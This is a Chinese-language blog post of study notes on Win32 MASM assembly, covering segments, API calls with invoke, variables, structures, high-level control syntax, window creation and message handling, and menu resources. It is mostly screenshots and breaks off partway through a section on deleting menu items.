    <url>/2023/07/15/%E6%B1%87%E7%BC%96/win32%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="win32汇编"><a href="#win32汇编" class="headerlink" title="win32汇编"></a>win32汇编</h1><h2 id="模式定义"><a href="#模式定义" class="headerlink" title="模式定义"></a>模式定义</h2><ol><li><p>定义了程序使用的指令集、互作模式和格式</p></li><li><p>win32环境中<code>.386</code>是必不可少的</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715173340028.png" alt="image-20230715173340028"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715173449273.png" alt="image-20230715173449273"></p></li><li><p>后面带<code>p</code>则是伪指令</p></li><li><p>内存模式</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715173747893.png" alt="image-20230715173747893"></p><p>但是主要使用的是<code>flat</code></p><blockquote><p>因win32程序只有一种内存模式，flat模式，没有64kb的限制</p></blockquote></li><li><p>语言模式</p><p>除了在<code>.model</code>语句中指定内存模式意以外，还应该指定语言模式</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715174527757.png" alt="image-20230715174527757"></p><ul><li>stdcall的参数压栈方式是：从右往左</li></ul></li><li><p><code>option</code>语句</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715175305850.png" alt="image-20230715175305850"></p></li></ol><h2 id="短的定义"><a href="#短的定义" class="headerlink" title="短的定义"></a>短的定义</h2><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715180311206.png" alt="image-20230715180311206"></p><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715194544213.png" alt="image-20230715194544213"></p><ol><li><p>可读可写的已定义的变量</p><p>这些数据在<code>.data</code>的段中，是已初始化的数据段。<code>.data</code>的段存放在可执行文件的_DATA字节区内</p></li><li><p>可读可写的未定义的变量</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715195000045.png" alt="image-20230715195000045"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715195240031.png" alt="image-20230715195240031"></p></li><li><p>常量</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715195356997.png" alt="image-20230715195356997"></p></li></ol><h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><ol><li>所有的指令都在代码段里面</li><li>代码段是放在_TEXT的节区中的</li></ol><h2 id="简单知识点"><a href="#简单知识点" class="headerlink" title="简单知识点"></a>简单知识点</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><ol><li><p>在代码前面写”;”，代表注释处理 </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715201548889.png" alt="image-20230715201548889"></p></li></ol><h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h3><ol><li>由于程序的某一行过长，不利于阅读时可以使用<code>\</code>做换行符</li></ol><h3 id="调用API函数"><a href="#调用API函数" class="headerlink" title="调用API函数"></a>调用API函数</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715201811427.png" alt="image-20230715201811427"></p><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715201856489.png" alt="image-20230715201856489"></p><h3 id="动态链接库（dll）"><a href="#动态链接库（dll）" class="headerlink" title="动态链接库（dll）"></a>动态链接库（dll）</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715202519213.png" alt="image-20230715202519213"></p><h3 id="使用invoke语句"><a href="#使用invoke语句" class="headerlink" title="使用invoke语句"></a>使用invoke语句</h3><p><img src="C:\Users\12414\Desktop\image-20230715203657995.png" alt="image-20230715203657995"></p><h3 id="API函数的返回值"><a href="#API函数的返回值" class="headerlink" title="API函数的返回值"></a>API函数的返回值</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715203928273.png" alt="image-20230715203928273"></p><ol><li><p>返回值保存在<code>eax</code>寄存器当中‘</p></li><li><p>返回值都是4个字节。</p><p>如果超出4个字节的字符串，这个时候返回的就是指针（32位下的指针是4个字节）</p></li></ol><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715204231533.png" alt="image-20230715204231533"><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715204632946.png" alt="image-20230715204632946"></p><ol><li><p>使用<code>proto</code></p></li><li><p>距离</p><blockquote><p>win32是4G 的平坦段，无所谓距离</p><p>在Win32汇编中，函数定义时使用的距离（distance）是指函数内部的相对偏移量，用于表示函数内部的标签或指令之间的距离。</p><p>在汇编语言中，函数通常由一系列的指令组成，每个指令都有一个相对于函数起始地址的偏移量。这个偏移量被称为距离。</p></blockquote></li><li><p>对于win32汇编的参数值只有dword一种，也就是说只有4个字节</p></li></ol><h3 id="include语句"><a href="#include语句" class="headerlink" title="include语句"></a>include语句</h3><ol><li><p>包含头文件</p></li><li><p>包含的两个方式】</p><p><code>include &lt;头文件的名字&gt;</code></p><p><code>include 头文件的名字 </code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715215236758.png" alt="image-20230715215236758"></p></li></ol><h3 id="includelib"><a href="#includelib" class="headerlink" title="includelib"></a>includelib</h3><ol><li><p>导入库文件</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230715215645107.png" alt="image-20230715215645107"></p></li><li><p>一般库文件和动态链接库的名字相同，后缀不同</p></li><li><p>使用lib更像是一个借用，但是使用include是将文件拷贝到程序当中</p></li></ol><h3 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h3><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/undefinedimage-20230716084312490.png" alt="image-20230716084312490"></p><ol><li><p>MB_OK是一个按钮，表示确定</p><p>具体的信息可以查vs的字典  </p></li><li><p>在win32汇编里面不需要使用je,jmp等</p><p>可以使用if,elseif,else </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716085208255.png" alt="image-20230716085208255"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716085421317.png" alt="image-20230716085421317"></p></li></ol><h3 id="标号"><a href="#标号" class="headerlink" title="标号"></a>标号</h3><ol><li><p>可以理解为c语言的<code>goto</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716090026683.png" alt="image-20230716090026683"></p></li><li><p>为了解决标号名称的浪费可以使用</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716090405835.png" alt="image-20230716090405835"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716090423891.png" alt="image-20230716090423891"></p></li></ol><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><ol><li><p>类型</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716090725511.png" alt="image-20230716090725511"></p></li></ol><h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><ol><li><p>通过修改堆栈的指针<code>esp</code>来预留需要的空间</p><p>其实这个和C语言的调用是一样的</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716091713070.png" alt="image-20230716091713070"></p></li><li><p>使用<code>local</code>定义局部变量</p></li><li><p>而且数据必须在代码之前 </p></li><li><p>局部变量的使用</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716093250606.png" alt="image-20230716093250606"></p></li><li><p>对局部变量的初始化</p><p><code>RtlZeroMemory</code>这个API函数经行初始化</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716094212170.png" alt="image-20230716094212170"></p></li></ol><h4 id="变量的使用"><a href="#变量的使用" class="headerlink" title="变量的使用"></a>变量的使用</h4><ol><li><p>强制类型转换</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716095945277.png" alt="image-20230716095945277"></p></li></ol><h4 id="变量的尺寸"><a href="#变量的尺寸" class="headerlink" title="变量的尺寸"></a>变量的尺寸</h4><ol><li><p>数据的长度计算</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716100100399.png" alt="image-20230716100100399"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716101511844.png" alt="image-20230716101511844"></p></li></ol><h4 id="获取变量的地址"><a href="#获取变量的地址" class="headerlink" title="获取变量的地址"></a>获取变量的地址</h4><ol><li><p>使用<code>lea</code></p><p>   <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716102702916.png" alt="image-20230716102702916"></p></li><li><p>解析addr</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716104922959.png" alt="image-20230716104922959"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716105002004.png" alt="image-20230716105002004"></p><p>在有addr的程序中，不用eax</p></li></ol><h3 id="使用子程序"><a href="#使用子程序" class="headerlink" title="使用子程序"></a>使用子程序</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716105222790.png" alt="image-20230716105222790"></p><ol><li><p>相当于函数  </p></li><li><p>参数的传递和堆栈的平衡</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716105929452.png" alt="image-20230716105929452"></p><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716110042079.png" alt="image-20230716110042079"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716110153358.png" alt="image-20230716110153358"></p></li></ol><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ol><li>实现的语法</li></ol><p>   <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716111534344.png" alt="image-20230716111534344"></p><p>   <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716111607802.png" alt="image-20230716111607802"> </p><p>   例子：</p><p>   <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716112122258.png" alt="image-20230716112122258"></p><ol start="2"><li><p>实现引用</p><ul><li><p>使用点操作符</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716112706165.png" alt="image-20230716112706165"></p></li><li><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716122834546.png" alt="image-20230716122834546"></p></li><li><p>使用<code>assume</code>伪指令把寄存器预先定义为结构指针</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716123018164.png" alt="image-20230716123018164"></p></li></ul></li></ol><h2 id="win汇编的高级语法"><a href="#win汇编的高级语法" class="headerlink" title="win汇编的高级语法"></a>win汇编的高级语法</h2><ol><li>补充了：条件测试，分支和循环等高级语法</li></ol><h3 id="条件测试"><a href="#条件测试" class="headerlink" title="条件测试"></a>条件测试</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716125149179.png" alt="image-20230716125149179"></p><p> 但是注意条件判断的左边只能是变量，不能为常数；而且两边不能同时为变量，但可以是寄存器</p><h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><ol><li><p>下面是格式</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716125613059.png" alt="image-20230716125613059"></p></li></ol><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><ol><li><p>while语法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716131816020.png" alt="image-20230716131816020"></p><p>​<img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716131856832.png" alt="image-20230716131856832"></p><p>使用break 的时候我们记得指出退出的条件</p></li><li><p>do_while()语法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716133337992.png" alt="image-20230716133337992"></p></li></ol><h2 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h2><h3 id="匈牙利命名法"><a href="#匈牙利命名法" class="headerlink" title="匈牙利命名法"></a>匈牙利命名法</h3><ol><li>格式是类型前缀加上变量说明</li></ol><ul><li><p>类型使用小写字母表示</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716144300168.png" alt="image-20230716144300168"></p><p><code>sz</code>表示以0结尾的字符串，<code>dw</code>表示<code>double word </code>，<code>h</code>表示句柄</p><p>常用的前缀</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716144512642.png" alt="image-20230716144512642"></p></li><li><p>变量名采用的双峰命名法</p></li></ul><ol start="2"><li><p>全局变量和局部变量</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716144924625.png" alt="image-20230716144924625"></p></li></ol><h3 id="代码的书写风格"><a href="#代码的书写风格" class="headerlink" title="代码的书写风格"></a>代码的书写风格</h3><ol><li><p>排版方式</p><p>对于指令和寄存器是不区分大小写</p><p>但是指令和寄存器等要使用小写字母</p><p>而用<code>equ</code>等位操作符定义的变量则使用大写的字母</p><p>变量和标号使用匈牙利表示法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716145044120.png" alt="image-20230716145044120"></p></li><li><p>注释和空行</p><p>总结的开说我们需要写合适的注释就好了，不要太多但是也不来能没有</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716145822421.png" alt="image-20230716145822421"></p></li><li><p>代码的组织模式</p></li></ol><h2 id="窗口程序执行过程"><a href="#窗口程序执行过程" class="headerlink" title="窗口程序执行过程"></a>窗口程序执行过程</h2><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716151134078.png" alt="image-20230716151134078"></p><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716153229377.png" alt="image-20230716153229377"></p><ol><li><p>使用satrt开始，endsatrt结束，但是需要添加<code>invokeExitProcess,NULL</code>，不然会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.code; 写在代码段<br>start:<br>invokeExitProcess,NULL   ;退出程序<br>end start   ;结束<br></code></pre></td></tr></table></figure></li><li><p>详细的过程</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716221210923.png" alt="image-20230716221210923"></p></li><li><p><code>PostMassage</code>和<code>SendMessage</code>主要是用于消息的转发机制</p></li><li><p>有两个问题</p></li></ol><ul><li><p>为什么windows调用窗口，直接处理信息不是更简单吗？</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716222442970.png" alt="image-20230716222442970"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716222503487.png" alt="image-20230716222503487"></p></li></ul><h2 id="窗口程序的解剖"><a href="#窗口程序的解剖" class="headerlink" title="窗口程序的解剖"></a>窗口程序的解剖</h2><h3 id="句柄"><a href="#句柄" class="headerlink" title="句柄"></a>句柄</h3><ol><li><p>可以理解为窗口的序号</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716223151317.png" alt="image-20230716223151317"></p></li><li><p>模块和句柄</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716224038899.png" alt="image-20230716224038899"></p><ul><li><p>得到句柄使用<code>GetModuleHandle</code></p></li><li><p>例子</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716224248893.png" alt="image-20230716224248893"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230716224430994.png" alt="image-20230716224430994"></p><p>如果使用的参数是<code>NULL</code>那么我们就是调用的是调用者的句柄</p></li></ul></li></ol><h3 id="创建窗口"><a href="#创建窗口" class="headerlink" title="创建窗口"></a>创建窗口</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717082341757.png" alt="image-20230717082341757"></p><ol><li><p>注册窗口类</p><p><code>RegisterClassEx</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717082647963.png" alt="image-20230717082647963"></p></li><li><p>创建窗口类</p><p><code>WNDCLASSEX</code>的结构各字段的含义 </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717083225200.png" alt="image-20230717083225200"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717083339200.png" alt="image-20230717083339200"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717083437467.png" alt="image-20230717083437467"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717083618134.png" alt="image-20230717083618134"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717093314962.png" alt="image-20230717093314962"></p></li><li><p>建立窗口 </p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717094332560.png" alt="image-20230717094332560"></p><p>建立窗口的函数CreatWindowEx&#96;</p><p>下面是使用方法：</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717094412098.png" alt="image-20230717094412098"></p><p>第二个参数<code>IpClassName</code>就是表明使用的窗口的类型，这里使用自己自定义的窗口</p><p>第三个参数是<code>IpWindowName</code>这个是窗口的名称</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717094815772.png" alt="image-20230717094815772"></p><p>第十个参数是菜单的句柄</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717094842573.png" alt="image-20230717094842573"></p><p>第十一个参数<code>HInstance</code>指定窗口所属的层序模块</p><p>第九个参数<code>hWndParent</code>设置父窗口</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717095031636.png" alt="image-20230717095031636"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717095105968.png" alt="image-20230717095105968"></p><p>第四个参数<code>dwstyle</code> 指出需要的风格（预定的值可以查看）</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717095138524.png" alt="image-20230717095138524"></p></li></ol><h3 id="ShowWindow"><a href="#ShowWindow" class="headerlink" title="ShowWindow"></a><code>ShowWindow</code></h3><p>主要是显示窗口和控制窗口的显示状态</p><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717095741377.png" alt="image-20230717095741377"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717095916043.png" alt="image-20230717095916043"></p><h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717101238518.png" alt="image-20230717101238518"></p><p>一般形式：</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717101314519.png" alt="image-20230717101314519"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717101430013.png" alt="image-20230717101430013"></p><p>当指定没有信息的不在获取cpu时间片</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717102012261.png" alt="image-20230717102012261"></p><p>我们使用的是<code>PeekMessage</code>加上条件判断来控制cpu的时间片的</p><h3 id="窗口过程"><a href="#窗口过程" class="headerlink" title="窗口过程"></a>窗口过程</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717102555823.png" alt="image-20230717102555823"></p><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717103506340.png" alt="image-20230717103506340"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717103942765.png" alt="image-20230717103942765"></p><p>下面这张图的意思就是说我们不能直接使用DestroyWindow来摧毁窗口。而是我们使用<code>PodtQuiTMessage</code>来摧毁信息回环机制</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717104354934.png" alt="image-20230717104354934"></p><h2 id="关于程序接受信息的顺序"><a href="#关于程序接受信息的顺序" class="headerlink" title="关于程序接受信息的顺序"></a>关于程序接受信息的顺序</h2><ol><li><p>在使用<code>CreatWindowEx</code>时发送窗口接收到的信息</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717105407878.png" alt="image-20230717105407878"></p></li><li><p>使用DestroyWindow摧毁窗口的时候发送的信息</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717143337820.png" alt="image-20230717143337820"></p><p>大部分的信息都不需要程序自己关心，windows只是尽义务的通知窗口过程而已</p><p>下面是程序需要自己关心的</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717143452332.png" alt="image-20230717143452332"></p><p>  <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717143731304.png" alt="image-20230717143731304"></p></li><li><p><code>Defwindowproc</code>信息的默认处理机制</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717144409193.png" alt="image-20230717144409193"></p></li></ol><h2 id="窗口间的消息互发"><a href="#窗口间的消息互发" class="headerlink" title="窗口间的消息互发"></a>窗口间的消息互发</h2><ol><li><p>主要是使用<code>PostMessage</code>和<code>SendMessage</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717144914095.png" alt="image-20230717144914095"></p></li><li><p>类似于<code>printf</code>的函数<code>wsprintf</code></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717145123909.png" alt="image-20230717145123909"></p></li><li><p>为什么字符串的地址不一样</p><blockquote><p>因为windows对字符串进行了拷贝</p></blockquote><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717151631460.png" alt="image-20230717151631460"></p></li></ol><h2 id="在窗口见传递数据"><a href="#在窗口见传递数据" class="headerlink" title="在窗口见传递数据"></a>在窗口见传递数据</h2><ol><li><p>使用<code>WM_COPYDATA</code>信息</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717151827583.png" alt="image-20230717151827583"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717151940270.png" alt="image-20230717151940270"></p><p>类似于C语言的传址的传参</p><p>因为使用的是共享的内存</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717152252202.png" alt="image-20230717152252202"></p></li><li><p><code>SendMessage</code>和<code>PostMessage</code>的区别</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717153331916.png" alt="image-20230717153331916"></p></li></ol><h2 id="实践性"><a href="#实践性" class="headerlink" title="实践性"></a>实践性</h2><h3 id="使用资源"><a href="#使用资源" class="headerlink" title="使用资源"></a>使用资源</h3><ol><li>程序运行&#x3D;代码的创建+资源的运行</li><li>源文件是以<code>rc</code>为扩展名的脚本文件</li></ol><h3 id="菜单的定义框架"><a href="#菜单的定义框架" class="headerlink" title="菜单的定义框架"></a>菜单的定义框架</h3><p> <img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717160403774.png" alt="image-20230717160403774"></p><ul><li><p>方法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717160636378.png" alt="image-20230717160636378"></p></li><li><p>方法一：</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717160711329.png" alt="image-20230717160711329"></p></li><li><p>方法二：定义的是菜单项之间的分割线</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717160919253.png" alt="image-20230717160919253"></p></li><li><p>方法三</p><p>定义的是子菜单</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717161052164.png" alt="image-20230717161052164"></p></li></ul><h3 id="加载菜单和加速键"><a href="#加载菜单和加速键" class="headerlink" title="加载菜单和加速键"></a>加载菜单和加速键</h3><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717173039779.png" alt="image-20230717173039779"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717173321243.png" alt="image-20230717173321243"></p><h3 id="菜单项的修改"><a href="#菜单项的修改" class="headerlink" title="菜单项的修改"></a>菜单项的修改</h3><ol><li><p>插入菜单项</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717174026872.png" alt="image-20230717174026872"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717174205538.png" alt="image-20230717174205538"></p></li><li><p>修改菜单项</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230717174234587.png" alt="image-20230717174234587"></p></li><li><p>删除菜单项</p><p><img src="C:\Users\12414\Desktop\hexo\source_posts\汇编\win32汇编.assets\image-20230717174312970.png" 